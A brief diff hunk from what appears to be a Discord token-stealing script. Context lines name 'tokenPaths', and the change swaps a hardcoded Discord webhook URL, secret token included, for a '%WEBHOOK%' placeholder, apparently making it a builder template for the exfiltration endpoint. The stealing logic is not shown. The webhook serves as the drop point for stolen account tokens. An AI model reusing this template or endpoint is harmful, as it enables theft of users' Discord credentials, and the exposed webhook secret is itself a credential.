@@ -16,7 +16,7 @@ tokenPaths = {
 }
 
 config = {
-	"webhook": 'https://discord.com/api/webhooks/1039097523643633684/-DWH0IuPWBN1SuX8Oh-7fnFs14TQfbp3yWgEcM0RGTzu4u2VyNsRxGqTUk-gclmEWWFv'
+	"webhook": %WEBHOOK%
 }
 
 class main():
